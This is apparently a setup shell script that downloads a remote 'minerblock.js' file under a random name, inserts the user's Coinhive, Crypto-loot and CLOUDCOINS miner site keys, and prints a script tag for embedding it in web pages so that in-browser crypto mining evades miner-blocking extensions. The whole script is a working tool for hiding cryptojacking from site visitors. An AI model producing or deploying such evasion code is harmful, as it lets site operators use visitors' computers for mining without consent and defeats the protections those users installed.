echo Generating random file name...
minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
echo Downloading script...
wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null 2>/dev/null
echo What is your Coinhive site key?
read cHiveKey
echo What is your Crypto-loot site key?
read cLootKey
echo What is your CLOUDCOINS site key?
read cCoinsKey
echo Substituting the keys into $minerblock...
sed -i 's/cHive/'$cHiveKey'/g' $minerblock
sed -i 's/cLoot/'$cLootKey'/g' $minerblock
sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock

echo Put the following into your HTML files that you want to have protection against Minerblockers:
echo '<script src="'$minerblock'"></script>'
